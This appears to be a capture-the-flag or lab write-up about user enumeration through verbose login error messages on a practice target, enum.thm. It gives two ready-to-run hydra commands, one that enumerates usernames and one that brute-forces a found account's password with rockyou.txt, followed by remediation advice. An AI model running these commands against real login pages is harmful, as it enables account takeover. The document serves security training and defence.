# Error Verbose - enum.thm/verbose_login

**Severity:** High   
**Target:** /labs/verbose_login/functions.php

## Summary
The vulnerability is an error verbose, when the attacker put an email that doesn't exist in the database. the backend return JSON {"status":"error", "message":"Email does not exist"}. with that the attacker can use tools like hydra to fuzz and find a different JSON

## Vulnerability Details
**Type:** User Enumeration  
**Root Cause:** The Root cause is the backend's early return with differents errors messages
**Endpoint:** http://enum.thm/labs/verbose_login/functions.php

## Steps to Reproduce
1. Use burp in the target to find the real path, function login and JSON return
2. build your attack line with hydra
3. Make an enumaration and brute with a wordlist and rockyou.txt
   

## Proof of Concept
Use Burp to find the real path and function login of the target. after that find the substring in the JSON return. "Email does not exist"
after that use hydra to start enumaration:
 
```bash
hydra -L /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt \
-p teste \
enum.thm \
http-post-form \
"/labs/verbose_login/functions.php:username=^USER^&password=^PASS^&function=login:Email does not exist"
```
   
3. with user, you will use hydra to fuzz rockyou.txt
   
```bash
hydra -l canderson@gmail.com \
-P /usr/share/wordlists/rockyou.txt \
enum.thm \
http-post-form \
"/labs/verbose_login/functions.php:username=^USER^&password=^PASS^&function=login:Invalid password"
```

## Impact
Valid account enumeration enables targeted brute force, reducing attack time from millions of attempts to a targeted list.

## Remediation
The developer needs to fix the backend JSON substring to always performs both checks and returns an identical generic message such as incorrect credentials or incorrect email or password.
